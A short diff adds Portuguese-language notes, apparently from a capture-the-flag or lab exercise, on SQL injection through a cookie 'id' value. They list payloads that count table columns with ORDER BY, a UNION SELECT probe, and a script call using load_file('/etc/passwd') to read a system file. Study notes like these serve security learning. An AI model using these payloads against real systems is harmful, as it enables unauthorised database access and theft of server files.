@@ -1,0 +1,13 @@
+id: d801699cd31940b343770e08d0478633'
+
+Atraves do Inspect -> Storage -> Cookies
+- Pelo valor do id do cookie e possivel fazer um sql injection 
+
+- Descobrir quantos campos tem a tabela.  
+	d801699cd31940b343770e08d0478633' order by 2# (# e um comentario)
+	
+
+
+	d801699cd31940b343770e08d0478633' UNION SELECT 1,2#
+	
+-python sqli.py "load_file('/etc/passwd')"
